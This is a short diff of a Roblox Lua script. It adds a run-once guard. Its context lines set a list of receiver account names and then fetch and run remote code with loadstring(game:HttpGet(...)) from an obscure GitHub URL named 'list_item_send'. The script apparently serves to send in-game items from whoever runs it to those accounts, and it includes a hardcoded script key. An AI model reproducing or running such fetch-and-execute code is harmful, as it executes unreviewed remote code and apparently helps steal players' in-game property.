@@ -1,3 +1,13 @@
+if _G.TAG then
+    warn("Script đã được chạy trước đó!")
+    return -- Dừng script nếu đã chạy
+end
+
+-- Đánh dấu script đã được chạy
+_G.TAG = true
+
+
+---------------------------------------------------------------------------------------------------------------------------
 local Players = game:GetService("Players")
 	local player = Players.LocalPlayer
 
@@ -28,7 +38,7 @@ local Players = game:GetService("Players")
 		getgenv().GMAIL_RECEIVERS = {"sijmongirthss","1940Mosier3104","soystaylan5","dreddyewele60","1971Nowak3135"}
 		--warn("Tên người chơi không nằm trong danh sách hợp lệ.")
 	end
-
+---------------------------------------------------------------------------------------------------------------------------
 loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/list_item_send"))()
 
 script_key = "IAMAiZhmvPSarFAwYGimVtcLzrqIAnAQ";
